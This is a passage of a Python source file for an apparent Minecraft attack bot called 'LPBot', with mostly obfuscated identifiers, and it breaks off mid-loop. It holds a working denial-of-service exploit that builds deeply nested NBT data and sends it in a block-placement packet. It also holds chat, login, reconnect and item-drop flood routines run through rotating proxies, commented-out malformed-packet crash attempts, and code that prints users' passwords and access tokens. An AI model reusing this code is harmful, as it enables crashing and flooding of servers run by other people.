# coding=utf-8


from SyncPrint import *
mchars ='SXYdefghilmnopZ1234\\/56789!aTUVWbcqrstuvwxyzABPCDEFILMNOGHQR'
import socks ,urllib2 ,struct ,threading , time ,binascii ,hashlib ,re ,sys ,random ,string ,ProxyManager ,socket ,io
import struct
import json
from uuid import UUID
import requests
from simplejson import dumps as json_dumps
from Crypto .Cipher import AES
from Crypto import Random
from Crypto .PublicKey import RSA
import getpass
from optparse import OptionParser
from io import BytesIO

from minecraft import authentication
from minecraft.exceptions import YggdrasilError
from minecraft.networking.connection import Connection
from minecraft.networking.packets import BlockPlacementPacket, PacketBuffer, ChatMessagePacket, ChatPacket
from minecraft.compat import input


def tag_id_and_name(nbt_id, name, data):
    data.write(struct.pack('>b', nbt_id))
    name = name.encode('utf-8')
    data.write(struct.pack('>h', len(name)))
    data.write(name)


def write_lists(recursion_count, data):
    if recursion_count > 4:
        return

    tag_id_and_name(9, "", data)
    data.write(struct.pack('>b', 9))
    data.write(struct.pack('>i', 10))
    for i in range(10):
        write_lists(recursion_count + 1, data)


def generate_exploitative_nbt():
    data = BytesIO()

    tag_id_and_name(10, "rekt", data)

    for i in range(300):
        if i % 20 == 0:
            print("List count: " + str(i))
        write_lists(0, data)

    data.write(struct.pack('>b', 0))
    return data.getvalue()


def main():
    exploit_data = generate_exploitative_nbt()
    print("Tamaño del exploit: " + str(len(exploit_data)))

    exploit_packet_data = PacketBuffer()

    exploit_packet = BlockPlacementPacket()
    exploit_packet.position = 0
    exploit_packet.face = 0
    exploit_packet.held_item_id = 1
    exploit_packet.held_item_count = 1
    exploit_packet.held_item_damage = 0
    exploit_packet.held_item_nbt = exploit_data
    exploit_packet.cursor_position_x = 0
    exploit_packet.cursor_position_y = 0
    exploit_packet.cursor_position_z = 0

    exploit_packet.write(exploit_packet_data, compression_threshold=500)
    exploit_packet_data = exploit_packet_data.get_writable()

    print("Exploit Size -  " + str(len(exploit_packet_data)))





def dummy (OOOOOOO0OOOO0OO0O ,OOO0OOOOO0O0OOOO0 ):
    pass
ids =[46 ,49 ,7 ,57 ,322 ]
def _OO000OO0O0O0OO0O0 (O00OOO0OOOO0O0O00 ):
    OOOO00O000000O0OO =O00OOO0OOOO0O0O00 .find ('\x00')
    if OOOO00O000000O0OO >0 :
        return O00OOO0OOOO0O0O00 [OOOO00O000000O0OO +1 :]
def _OOOOOO0O00OOOO0OO (OO0O000OOO0OO0OO0 ):
    assert len (OO0O000OOO0OO0OO0 )<117
    OOOOOO0O0OOO0O0O0 =""
    while len (OOOOOO0O0OOO0O0O0 )<125 -len (OO0O000OOO0OO0OO0 ):
        O0OOOOOOO0OO0OOOO =Random .get_random_bytes (1 )
        if O0OOOOOOO0OO0OOOO !='\x00':
            OOOOOO0O0OOO0O0O0 +=O0OOOOOOO0OO0OOOO
    return '\x00\x02%s\x00%s'%(OOOOOO0O0OOO0O0O0 ,OO0O000OOO0OO0OO0 )
def generate_key_pair ():
    return RSA .generate (1024 )
def encode_public_key (O00OO00O0O000OO0O ):
    return O00OO00O0O000OO0O .publickey ().exportKey (format ="DER")
def generate_random_bytes (OO000OO0O0OOO0OOO ):
    return Random .get_random_bytes (OO000OO0O0OOO0OOO )
def generate_challenge_token ():
    return generate_random_bytes (4 )
def generate_server_id ():
    return "".join ("%02x"%ord (O0OOOO0OO0OO00OO0 )for O0OOOO0OO0OO00OO0 in generate_random_bytes (10 ))
def decrypt_with_private_key (O00OOO00O0O0O0O0O ,O0000OOOOO00OOOO0 ):
    return _OO000OO0O0O0OO0O0 (O0000OOOOO00OOOO0 .decrypt (O00OOO00O0O0O0O0O ))
def generated_cipher (O0O000OO0O000O0O0 ):
    return AES .new (O0O000OO0O000O0O0 ,AES .MODE_CFB ,O0O000OO0O000O0O0 )
def decode_public_key (O0000OOO000O0OO0O ):
    return RSA .importKey (O0000OOO000O0OO0O )
def generate_shared_secret ():
    return generate_random_bytes (16 )
def encrypt_with_public_key (OO00O0O00OOOOOOOO ,OO00000OO0OO00000 ):
    return OO00000OO0OO00000 .encrypt (_OOOOOO0O00OOOO0OO (OO00O0O00OOOOOOOO ),0 )[0 ]
def make_server_hash (OOOO000OOO000O0OO ,OOOO00O00OO000O0O ,OOO00O00OOO00OO0O ):
    O0O000O0OO0O0O00O =hashlib .sha1 ()
    O0O000O0OO0O0O00O .update (OOOO000OOO000O0OO )
    O0O000O0OO0O0O00O .update (OOOO00O00OO000O0O )
    O0O000O0OO0O0O00O .update (encode_public_key (OOO00O00OOO00OO0O ))
    O0OO0O0O000OOOOO0 =long (O0O000O0OO0O0O00O .hexdigest (),16 )
    if O0OO0O0O000OOOOO0 >>39 *4 &0x8 :
        return "-%x"%((-O0OO0O0O000OOOOO0 )&(2 **(40 *4 )-1 ))
    return "%x"%O0OO0O0O000OOOOO0
def join_server (OO00O0OOO0OOOOO00 ,OOO00OOO0O00O0OO0 ):
    OO0O0O0O00OOO0O00 =requests .post ('https://sessionserver.mojang.com/session/minecraft/join',data =json_dumps ({'accessToken':OO00O0OOO0OOOOO00 .access_token ,'selectedProfile':OO00O0OOO0OOOOO00 .uuid_hex ,'serverId':OOO00OOO0O00O0OO0 ,}),headers ={'Content-Type':'application/json','User-Agent':None ,})
    return OO0O0O0O00OOO0O00 .status_code in (200 ,204 )
def check_player (OO0OOOOOO0OO0OO00 ,OOOO00O0OOOOOOOOO ):
    O00O0000000OOOO00 =requests .get ('https://sessionserver.mojang.com/session/minecraft/hasJoined?username=%s&serverId=%s'%(OO0OOOOOO0OO0OO00 ,OOOO00O0OOOOOOOOO ))
    return None if O00O0000000OOOO00 .status_code !=200 else O00O0000000OOOO00 .json ()
class Session (object ):
    YGGDRASIL_BASE ="https://authserver.mojang.com"
    @classmethod
    def make_client_token (OOOOOOOOO0OOO00O0 ):
        return "".join ("%02x"%ord (O000OOOO0O0OOOO0O )for O000OOOO0O0OOOO0O in generate_random_bytes (16 ))
    @classmethod
    def from_credentials (O0OOOO000OO0OO0O0 ,OOOO0000000OOOO0O ,OO0OOOOOOOOO00OO0 ,client_token =None ):
        if client_token is None :
            client_token =O0OOOO000OO0OO0O0 .make_client_token ()
        OO0OOO0000O00OOOO =O0OOOO000OO0OO0O0 .do_request ("/authenticate",{'agent':{'name':'Minecraft','version':1 ,},'username':OOOO0000000OOOO0O ,'password':OO0OOOOOOOOO00OO0 ,'clientToken':client_token ,})
        syncprint (OO0OOO0000O00OOOO )
        syncprint (OO0OOO0000O00OOOO ['accessToken'])
        return O0OOOO000OO0OO0O0 (OO0OOO0000O00OOOO ['accessToken'],OO0OOO0000O00OOOO ['selectedProfile']['name'],OO0OOO0000O00OOOO ['selectedProfile']['id'])
    @classmethod
    def from_access_token (O00OOOO0O000O0OOO ,O00OOO0OOOOO0OOOO ):
        OO0OOO0OOO00O000O =O00OOOO0O000O0OOO .do_request ("/refresh",{'accessToken':O00OOO0OOOOO0OOOO })
        return O00OOOO0O000O0OOO (OO0OOO0OOO00O000O ['accessToken'],OO0OOO0OOO00O000O ['selectedProfile']['name'],OO0OOO0OOO00O000O ['selectedProfile']['id'])
    @classmethod
    def from_authinfo (OO0OO0OOO0OO0O00O ,O0OO0O00O00O0OO00 ,OO00000O0O0OO0000 ,OOO0OO00OOOOO0O00 ):
        return OO0OO0OOO0OO0O00O (O0OO0O00O00O0OO00 ,OO00000O0O0OO0000 ,OOO0OO00OOOOO0O00 ,)
    def __init__ (OOO000OO00OOO0O00 ,OOOO00O00O000OOO0 ,O0OO00OO000OOO0O0 ,O00O0O00O000OO000 ):
        OOO000OO00OOO0O00 ._access_token =OOOO00O00O000OOO0
        OOO000OO00OOO0O00 ._player_ign =O0OO00OO000OOO0O0
        OOO000OO00OOO0O00 ._uuid =UUID (O00O0O00O000OO000 )
    def refresh (OO00000000O00OOO0 ):
        return Session (OO00000000O00OOO0 ._access_token )
    @property
    def player_ign (O0OO0OOO0O0OOOOO0 ):
        return O0OO0OOO0O0OOOOO0 ._player_ign
    @property
    def uuid (O00OO0OOOO0OO0OO0 ):
        return str (O00OO0OOOO0OO0OO0 ._uuid )
    @property
    def uuid_hex (OOO0OO00000000O0O ):
        return OOO0OO00000000O0O ._uuid .hex
    @property
    def access_token (OOO0O0O0OO000O0O0 ):
        return OOO0O0O0OO000O0O0 ._access_token
    @property
    def session_id (O0O00000000O0O000 ):
        return 'token:%s:%s'%(O0O00000000O0O000 ._access_token ,O0O00000000O0O000 .uuid_hex )
    def __str__ (O000O0O0O00O0OO0O ):
        return "<Session: %s (%s) (accessToken: %s)>"%(O000O0O0O00O0OO0O ._player_ign ,O000O0O0O00O0OO0O ._uuid ,O000O0O0O00O0OO0O ._access_token )
    def validate (O0OO000OO0OO0O00O ):
        OOO0OO0OOOO000O00 =requests .post (O0OO000OO0OO0O00O .YGGDRASIL_BASE +"/validate",data =json_dumps ({'accessToken':O0OO000OO0OO0O00O ._access_token }))
        return OOO0OO0OOOO000O00 .status_code in (200 ,204 )
    def invalidate (O000O0O000O0OO00O ):
        O0O0OOO00O0OOO000 =requests .post (O000O0O000O0OO00O .YGGDRASIL_BASE +"/invalidate",data =json_dumps ({'accessToken':O000O0O000O0OO00O ._access_token }))
        return O0O0OOO00O0OOO000 .status_code in (200 ,204 )
    @classmethod
    def do_request (O00000O0O0O0OOOO0 ,O00O0OO0OO000O000 ,OO0000OOO0O0OOO0O ):
        try :
            O0000000OOOO0O0OO =requests .post (O00000O0O0O0OOOO0 .YGGDRASIL_BASE +O00O0OO0OO000O000 ,data =json_dumps (OO0000OOO0O0OOO0O ))
            if not O0000000OOOO0O0OO .ok :
                try :
                    O0O0OO0O00O0OOOO0 =O0000000OOOO0O0OO .json ()['errorMessage']
                except :
                    O0O0OO0O00O0OOOO0 ="unknown error"
                raise SessionException ("%d: %s"%(O0000000OOOO0O0OO .status_code ,O0O0OO0O00O0OOOO0 ))
            O00O00O0000OO000O =O0000000OOOO0O0OO .json ()
            return O00O00O0000OO000O
        except Exception as OO000OO0OO0O000O0 :
            syncprint (str (OO000OO0OO0O000O0 ))
def encode_varint (OOO0O00OO0OO0O00O ):
    return "".join (encode_varint_stream ([OOO0O00OO0OO0O00O ]))
def decode_varint (OOOO0O00O0O0OO000 ):
    return decode_varint_stream (OOOO0O00O0O0OO000 ).next ()
def encode_varint_stream (O0O00OOO000OO00OO ):
    for O0000000O00000O00 in O0O00OOO000OO00OO :
        while True :
            if O0000000O00000O00 >127 :
                yield chr ((1 <<7 )|(O0000000O00000O00 &0x7f ))
                O0000000O00000O00 >>=7
            else :
                yield chr (O0000000O00000O00 )
                break
def decode_varint_stream (OO000O0000O00O0OO ):
    O0OO0O00OOOOO0O00 =0
    OO0000OOO00O00OOO =1
    for O0OO0O0OO00O000OO in OO000O0000O00O0OO :
        OOOO0000000OO00O0 =ord (O0OO0O0OO00O000OO )
        O0OO0O00OOOOO0O00 +=(OOOO0000000OO00O0 &0x7f )*OO0000OOO00O00OOO
        if (OOOO0000000OO00O0 &0x80 ):
            OO0000OOO00O00OOO *=128
        else :
            yield O0OO0O00OOOOO0O00
            O0OO0O00OOOOO0O00 =0
            OO0000OOO00O00OOO =1
def CraftString (O000O00O0000O000O ):
    return encode_varint (len (O000O00O0000O000O ))+O000O00O0000O000O .encode ('utf_8')
def CraftStringMed (OOO00OO0000O0O0OO ):
    return struct .pack ('>h',len (OOO00OO0000O0O0OO ))+'\x00'+'\x00'.join (list (OOO00OO0000O0O0OO ))
def sr (size =6 ,chars =string .ascii_uppercase +string .digits ):
    return ''.join (random .choice (chars )for _OO0O0O000OO0O0OOO in range (size ))
def CraftStringOld (OOO0OO000OO000000 ):
    O00O0OOO0OOOO0O00 ='\x00'+'\x00'.join (list (OOO0OO000OO000000 ))
    return chr (len (OOO0OO000OO000000 ))+O00O0OOO0OOOO0O00
class CraftPlayer :
    _AES =None
    _session =None
    _printChat =True
    _nickname =''
    _password =''
    _protonum =210
    _proxy =''
    _sessionId =''
    _loggedIn =False
    _server =''
    _coordX =0
    _coordY =0
    _coordZ =0
    _sdebug =False
    _attacks =False
    _prependFlood =False
    _packet_len =-1 ;
    _threshold =-1 ;
    _packet =None ;
    _old_packet_id =0
    def SendPacket (O0OO0000OOOOOOO00 ,OOOO0O0OO00OO0O0O ):
        O0OO0000OOOOOOO00 ._sendBytes (str (encode_varint (len (OOOO0O0OO00OO0O0O )))+str (OOOO0O0OO00OO0O0O ))
    def _action (OO0OOOO0O00O0OO00 ):
        try :
            OO0OOOO0O00O0OO00 .SendPacket ('\x01'+CraftString (OO0OOOO0O00O0OO00 ._queuedMessages .pop (0 )))
        except :
            pass
        try :
            if OO0OOOO0O00O0OO00 ._connreconn :
                OO0OOOO0O00O0OO00 ._socket .close ()
                OO0OOOO0O00O0OO00 ._connreconn =False
            for OOO0000OO0O0000OO in OO0OOOO0O00O0OO00 ._attacks :
                if OOO0000OO0O0000OO =='sM':
                    OO0OOOO0O00O0OO00 ._attacks .remove ('sM')
                    OO0000OO0OO00OO0O =OO0OOOO0O00O0OO00 ._prependFlood
                    O000O0OO00O000000 =OO0OOOO0O00O0OO00 ._msg
                    if O000O0OO00O000000 =='':
                        OO0OOOO0O00O0OO00 .SendPacket ('\x01'+CraftString (OO0000OO0OO00OO0O +''.join ((random .choice (mchars )for O0000OO0OO0OOOO0O in range (random .randint (8 ,90 -len (OO0000OO0OO00OO0O )))))))
                    else :
                        OO0OOOO0O00O0OO00 .SendPacket ('\x01'+CraftString (O000O0OO00O000000 ))
                if OOO0000OO0O0000OO =='chatFlood':
                    OO0000OO0OO00OO0O =OO0OOOO0O00O0OO00 ._prependFlood
                    O000O0OO00O000000 =OO0OOOO0O00O0OO00 ._msg
                    if O000O0OO00O000000 =='':
                        OO0OOOO0O00O0OO00 .SendPacket ('\x01'+CraftString (OO0000OO0OO00OO0O +''.join ((random .choice (mchars )for OOO00O0OO00O0O0OO in range (random .randint (8 ,90 -len (OO0000OO0OO00OO0O )))))))
                    else :
                        OO0OOOO0O00O0OO00 .SendPacket ('\x01'+CraftString (O000O0OO00O000000 ))
                if OOO0000OO0O0000OO =='creativeDrop':
                    OO0OOOO0O00O0OO00 .SendPacket ('k\xff\xff'+struct .pack ('>h',random .choice (ids ))+'@\x00\x00')
                if OOO0000OO0O0000OO =='tO':
                    syncprint ('Exploit - Empezando..')
                    main()
                    connection.write_raw(exploit_packet_data)
                if OOO0000OO0O0000OO =='pFlood':
                    OOO0000OO0O0000OO =0
                    OO0OOOO0O00O0OO00 ._socket .sendall ('\x01'+CraftString ('aaaaaaaaaaaaaaa;'+'a'*500 ))
                    OO0OOOO0O00O0OO00 ._socket .close ()
                if OOO0000OO0O0000OO =='reconnectFlood':
                    OO0OOOO0O00O0OO00 ._socket .close ()
                    OO0OOOO0O00O0OO00 ._log ('Reconnecting...')
                if OOO0000OO0O0000OO =='authFlood':
                    OO0OOOO0O00O0OO00 .SendPacket ('\x01'+CraftString ("/login asdasidijasdijoaiosdjio"))
                    OO0OOOO0O00O0OO00 .SendPacket ('\x01'+CraftString ("/login asdasidijasdijoaiosdjio"))
        except :
            pass
    def __init__ (OO0OO0O000OOOOO0O ,O00000O0O0O000000 ,password ='',protonum =210 ,proxy ='',server ='',hostx ='',portx ='',isOffline =False ,printchat =True ,debug =False ,attacks =[],prependFlood ='',msg ='Attack by LPBot (BETA)',count =5 ,callback =dummy ,eventHook =None ):
        OO0OO0O000OOOOO0O ._queuedMessages =list ()
        OO0OO0O000OOOOO0O ._kre =False
        OO0OO0O000OOOOO0O ._eHook =eventHook
        OO0OO0O000OOOOO0O ._connreconn =False
        OO0OO0O000OOOOO0O ._msg =msg
        OO0OO0O000OOOOO0O ._count =count
        OO0OO0O000OOOOO0O ._nickname =O00000O0O0O000000
        OO0OO0O000OOOOO0O ._password =password
        OO0OO0O000OOOOO0O ._protonum =protonum
        OO0OO0O000OOOOO0O ._printChat =printchat
        OO0OO0O000OOOOO0O ._server =server
        OO0OO0O000OOOOO0O ._isOffline =isOffline
        OO0OO0O000OOOOO0O ._hostx =hostx
        OO0OO0O000OOOOO0O ._portx =portx
        if proxy !=None :
            OO0OO0O000OOOOO0O ._proxy =ProxyManager .getProxy ()
        OO0OO0O000OOOOO0O ._loggedIn =False
        OO0OO0O000OOOOO0O ._sdebug =debug
        OO0OO0O000OOOOO0O ._attacks =attacks
        OO0OO0O000OOOOO0O ._prependFlood =prependFlood
        OO0OO0O000OOOOO0O ._callback =callback
        OO0OO0O000OOOOO0O ._isConnected =False
        return
    def _connect (O0OOOOO00OOO00000 ):
        try :
            O0OOOOO00OOO00000 ._socket .close ()
        except :
            pass
        if O0OOOOO00OOO00000 ._password !="":
            syncprint (O0OOOOO00OOO00000 ._password )
            O0OOOOO00OOO00000 ._session =Session .from_credentials (O0OOOOO00OOO00000 ._nickname ,O0OOOOO00OOO00000 ._password )
            syncprint (O0OOOOO00OOO00000 ._password )
        O0OOOOO00OOO00000 ._socket =socks .socksocket ()
        O0OOOOO00OOO00000 ._socket .settimeout (15 )
        try :
            O0OOOOO00OOO00000 ._proxtype =O0OOOOO00OOO00000 ._proxy .split ('|')[0 ]
            O0OOOOO00OOO00000 ._proxport =O0OOOOO00OOO00000 ._proxy .split (':')[1 ]
            O0OOOOO00OOO00000 ._proxserver =O0OOOOO00OOO00000 ._proxy .split (':')[0 ].split ('|')[1 ]
            O0OOOOO00OOO00000 ._socket .setproxy (eval ("socks.PROXY_TYPE_"+O0OOOOO00OOO00000 ._proxtype ),O0OOOOO00OOO00000 ._proxserver ,int (O0OOOOO00OOO00000 ._proxport ))
        except :
            ProxyManager .badProxy (O0OOOOO00OOO00000 ._proxy )
        try :
            _O0O0OO0OOO0000O0O =O0OOOOO00OOO00000 ._server [0 ]
            _O0O0O00OO0OOOO000 =O0OOOOO00OOO00000 ._server [1 ]
            O0OOOOO00OOO00000 ._socket .connect ((_O0O0OO0OOO0000O0O ,_O0O0O00OO0OOOO000 ))
            #O0OOOOO00OOO00000 .SendPacket ('n0 s3curity w4s f0und bitch') // EXPLOIT SENDS INVALID PACKETS
            O0OOOOO00OOO00000 .SendPacket ('\x00'+encode_varint (O0OOOOO00OOO00000 ._protonum )+CraftString (_O0O0OO0OOO0000O0O )+struct .pack ('>h',_O0O0O00OO0OOOO000 )+encode_varint (2 ))
            #O0OOOOO00OOO00000 .SendPacket ('\x00'+encode_varint (O0OOOOO00OOO00000 ._protonum )+CraftString (_O0O0OO0OOO0000O0O )+struct .pack ('>h',_O0O0O00OO0OOOO000 )+encode_varint (0 )) // spams errors due to sending invalid trash (NOT TESTED IF CRASHES YET)
            O0OOOOO00OOO00000 .SendPacket ('\x00'+CraftString (O0OOOOO00OOO00000 ._nickname ))
            #O0OOOOO00OOO00000 .SendPacket ('\19919191919'+CraftString (O0OOOOO00OOO00000 ._nickname )) // Error at encryptionresponse event! 
            #O0OOOOO00OOO00000 .SendPacket ('\0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'+CraftString (O0OOOOO00OOO00000 ._nickname )) // Spams "Are mods in use" R.I.P
        except :
            ProxyManager .badProxy (O0OOOOO00OOO00000 ._proxy )
            return
        try :
            O0OOOOO00OOO00000 ._socket .settimeout (15 )
            O00O000000O000OO0 =O0OOOOO00OOO00000 ._startLoop ()
            if O00O000000O000OO0 =='KE':
                O0OOOOO00OOO00000 ._callback ('KE',O0OOOOO00OOO00000 )
        except Exception as O0OOO00OO000OO0O0 :
            syncprint (str (O0OOO00OO000OO0O0 ))
            if O0OOOOO00OOO00000 ._sdebug :
                raise
            return
    def _startLoop (OOO00OO0O00OOO0OO ):
        return OOO00OO0O00OOO0OO ._runLoop ()
    def _log (O0000OOOO0OOO0OO0 ,O0OOOO0OOO000OO00 ):
        O000O00O0OOO0000O =O0000OOOO0OOO0OO0 ._proxy .split ('|')
        if O0000OOOO0OOO0OO0 ._proxy ==None :
            O000O00O0OOO0000O =('None','')
        syncprint ('[LPBot] - INFO : Proxy Type - {:6} | IP - {:20} | Nickname - {:20} | Proceso -> {:}'.format (O000O00O0OOO0000O [0 ],O000O00O0OOO0000O [1 ],O0000OOOO0OOO0OO0 ._nickname ,O0OOOO0OOO000OO00 ))
        return
    def _debug (OOOO0000OO0OOO0O0 ,O00OOOO00OOOO0000 ):
        if OOOO0000OO0OOO0O0 ._sdebug :
            OOOO0000OO0OOO0O0 ._log (O00OOOO00OOOO0000 )
    def _sendBytes (OOOO0OOO0O0O0OO00 ,_O00OOOO0OOOOO0000 ):
        if OOOO0OOO0O0O0OO00 ._AES ==None :
            OOOO0OOO0O0O0OO00 ._socket .sendall (_O00OOOO0OOOOO0000 )
        else :
            OOOO0OOO0O0O0OO00 ._socket .sendall (OOOO0OOO0O0O0OO00 ._AES .encrypt (_O00OOOO0OOOOO0000 ))
    def _SendEncrypt (OOOOO00OO0OOO0O0O ,_OO000O0O0000O00OO ,_O000OO0OO0OO0O0O0 ):
        O000O0OO0O0000OOO =encode_varint (len (_OO000O0O0000O00OO ))
        O0OOOOOO0O0OO0OO0 =encode_varint (len (_O000OO0OO0OO0O0O0 ))
        OOOOO00OO0OOO0O0O .SendPacket ("\x01"+str (O000O0OO0O0000OOO )+_OO000O0O0000O00OO +str (O0OOOOOO0O0OO0OO0 )+_O000OO0OO0OO0O0O0 )
    def _getBytes (OO0O0OOOOO0OOO0OO ,_sz =1 ):
        O000O00O0O0O00O00 =''
        OO0000OOO0O00OOO0 =_sz
        if OO0O0OOOOO0OOO0OO ._packet ==None :
            if OO0O0OOOOO0OOO0OO ._AES !=None :
                while _sz !=0 :
                        O000O00O0O0O00O00 +=OO0O0OOOOO0OOO0OO ._AES .decrypt (OO0O0OOOOO0OOO0OO ._socket .recv (_sz ))
                        _sz =OO0000OOO0O00OOO0 -len (O000O00O0O0O00O00 )
            else :
                    while _sz !=0 :
                        O000O00O0O0O00O00 +=OO0O0OOOOO0OOO0OO ._socket .recv (_sz )
                        _sz =OO0000OOO0O00OOO0 -len (O000O00O0O0O00O00 )
        else :
            while _sz !=0 :
                O000O00O0O0O00O00 +=OO0O0OOOOO0OOO0OO ._packet .read (_sz )
                _sz =OO0000OOO0O00OOO0 -len (O000O00O0O0O00O00 )
        return O000O00O0O0O00O00
    def _getPacket (O0O0OO0OOOO00OOOO ):
        O0O0000O0O00O0O00 =''
        O000O00000OOO000O =O0O0OO0OOOO00OOOO ._packet_len
        if O0O0OO0OOOO00OOOO ._AES !=None :
            while O000O00000OOO000O !=0 :
                O0O0000O0O00O0O00 +=O0O0OO0OOOO00OOOO ._AES .decrypt (O0O0OO0OOOO00OOOO ._socket .recv (O000O00000OOO000O ))
                O000O00000OOO000O =O0O0OO0OOOO00OOOO ._packet_len -len (O0O0000O0O00O0O00 )
        else :
            while O000O00000OOO000O !=0 :
                O0O0000O0O00O0O00 +=O0O0OO0OOOO00OOOO ._socket .recv (O000O00000OOO000O )
                O000O00000OOO000O =O0O0OO0OOOO00OOOO ._packet_len -len (O0O0000O0O00O0O00 )
        return O0O0000O0O00O0O00
    def _read_short (OOOO00000O00O0O00 ):
        return struct .unpack (">h",OOOO00000O00O0O00 ._getBytes (2 ))[0 ]
    def _read_short_array (O000OOOO0000O00O0 ):
        O00000OOO00OO0O0O =O000OOOO0000O00O0 ._read_short ()
        return O000OOOO0000O00O0 ._getBytes (O00000OOO00OO0O0O )
    def _readVarint (O000O0000OO0O0OO0 ):
        O0OO00000O00OO0O0 =0
        O0O0O0000OO00O0O0 =1
        while 1 :
            OO00000OOO000OO0O =ord (O000O0000OO0O0OO0 ._getBytes (1 ))
            O0OO00000O00OO0O0 +=(OO00000OOO000OO0O &0x7f )*O0O0O0000OO00O0O0
            if (OO00000OOO000OO0O &0x80 ):
                syncprint("")
                O0O0O0000OO00O0O0 *=128
            else :
                syncprint (O0OO00000O00OO0O0 )
                return O0OO00000O00OO0O0
    def _readString (O000OOO0OOO00O00O ):
        OOOO0O0OOO0O00000 =O000OOO0OOO00O00O ._readVarint ()
        try :
            O0OOO0O00O0O0OOO0 =O000OOO0OOO00O00O ._getBytes (OOOO0O0OOO0O00000 )
        except :
            return ''
        return ''.join (O0OOO0O00O0O0OOO0 )
    def _itemEnchant (O0000000OOO0O000O ,O000OO0O000000O00 ):
        OO0OO000O000O0OOO =O000OO0O000000O00
        return 256 <=OO0OO000O000O0OOO and OO0OO000O000O0OOO <=259 or 267 <=OO0OO000O000O0OOO and OO0OO000O000O0OOO <=279 or 283 <=OO0OO000O000O0OOO and OO0OO000O000O0OOO <=286 or 290 <=OO0OO000O000O0OOO and OO0OO000O000O0OOO <=294 or 298 <=OO0OO000O000O0OOO and OO0OO000O000O0OOO <=317 or OO0OO000O000O0OOO ==261 or OO0OO000O000O0OOO ==359 or OO0OO000O000O0OOO ==346
    def _readSlot (O0O0OOO00O0OOO0OO ):
        O000000OO0OO000OO =int (binascii .b2a_hex (O0O0OOO00O0OOO0OO ._getBytes (2 )),16 )
        if O000000OO0OO000OO !=65535 :
            OO00O0OO0OOOOO00O =ord (O0O0OOO00O0OOO0OO ._getBytes (1 ))
            O0O000000OOOOOOOO =int (binascii .b2a_hex (O0O0OOO00O0OOO0OO ._getBytes (2 )),16 )
            if O0O0OOO00O0OOO0OO ._itemEnchant (O000000OO0OO000OO ):
                O0000O00OOOOO0OO0 =int (binascii .b2a_hex (O0O0OOO00O0OOO0OO ._getBytes (2 )),16 )
                if O0000O00OOOOO0OO0 ==65535 :
                    return
                while O0000O00OOOOO0OO0 !=0 :
                    O0O0OOO00O0OOO0OO ._getBytes (1 )
                    O0000O00OOOOO0OO0 =O0000O00OOOOO0OO0 -1
    def _genMetadata (OOO0O0OO0OO000O00 ):
        O00OOOOOOOO000OO0 ={}
        O000O00OOO0O000OO =ord (OOO0O0OO0OO000O00 ._getBytes (1 ))
        while O000O00OOO0O000OO !=127 :
            OOO0O0OO0OO000O00 ._debug (O000O00OOO0O000OO )
            OO00O000OO00O000O =O000O00OOO0O000OO &31
            OOO0OO00OO0OO00O0 =O000O00OOO0O000OO >>5
            OOO0O0OO0OO000O00 ._debug ("      "+str (OOO0OO00OO0OO00O0 ))
            if OOO0OO00OO0OO00O0 ==0 :
                O0O0OOOOO00OO000O =ord (OOO0O0OO0OO000O00 ._getBytes (1 ))
            if OOO0OO00OO0OO00O0 ==1 :
                O0O0OOOOO00OO000O =OOO0O0OO0OO000O00 ._getBytes (2 )
            if OOO0OO00OO0OO00O0 ==2 :
                O0O0OOOOO00OO000O =OOO0O0OO0OO000O00 ._getBytes (4 )
            if OOO0OO00OO0OO00O0 ==3 :
                O0O0OOOOO00OO000O =OOO0O0OO0OO000O00 ._getBytes (4 )
            if OOO0OO00OO0OO00O0 ==4 :
                O0O0OOOOO00OO000O =OOO0O0OO0OO000O00 ._readString ()
            if OOO0OO00OO0OO00O0 ==5 :
                OOO0O0OO0OO000O00 ._readSlot ()
            if OOO0OO00OO0OO00O0 ==6 :
                O0O0OOOOO00OO000O =[]
                for O00O0O0OOO0O000OO in range (3 ):
                    O0O0OOOOO00OO000O .append (OOO0O0OO0OO000O00 ._getBytes (4 ))
            O00OOOOOOOO000OO0 [OO00O000OO00O000O ]=(OOO0OO00OO0OO00O0 ,O0O0OOOOO00OO000O )
            O000O00OOO0O000OO =ord (OOO0O0OO0OO000O00 ._getBytes (1 ))
        return O00OOOOOOOO000OO0
    def _runLoop (OO00O0OO0OOO0000O ):
        while True :
            try :
                OO00O0OO0OOO0000O ._sdebug =True
                OO00O0OO0OOO0000O ._packet =None
                OO00O0OO0OOO0000O ._packet_len =OO00O0OO0OOO0000O ._readVarint ()
                if OO00O0OO0OOO0000O ._packet_len ==None or OO00O0OO0OOO0000O ._packet_len <=0 :
                    _O000O0O00000O0000 ='ER'
                if OO00O0OO0OOO0000O ._threshold !=-1 :
                    O000O00O0OOOO00OO =OO00O0OO0OOO0000O ._readVarint ()
                    O00O00O00OOOOO0OO =OO00O0OO0OOO0000O ._getPacket ()
                    if O000O00O0OOOO00OO ==0 :
                        OO00O0OO0OOO0000O ._packet =io .BytesIO (O00O00O00OOOOO0OO )
                    else :
                        OO00O0OO0OOO0000O ._packet =io .BytesIO (O00O00O00OOOOO0OO .decode ('zlib'))
                    _O000O0O00000O0000 =OO00O0OO0OOO0000O ._readVarint ()
                else :
                    O0OOO0OOO0OOO0000 =OO00O0OO0OOO0000O ._getPacket ()
                    OO00O0OO0OOO0000O ._packet =io .BytesIO (O0OOO0OOO0OOO0000 )
                    _O000O0O00000O0000 =OO00O0OO0OOO0000O ._readVarint ()
                OO00O0OO0OOO0000O ._old_packet_id =_O000O0O00000O0000
            except Exception as OO0O0O0OOO0O000OO :
                syncprint (str (OO0O0O0OOO0O000OO ))
                OO00O0OO0OOO0000O ._log ('Desconectado!')
                _O000O0O00000O0000 ='ER'
                return
            if OO00O0OO0OOO0000O ._isConnected ==False :
                if _O000O0O00000O0000 ==0x00 :
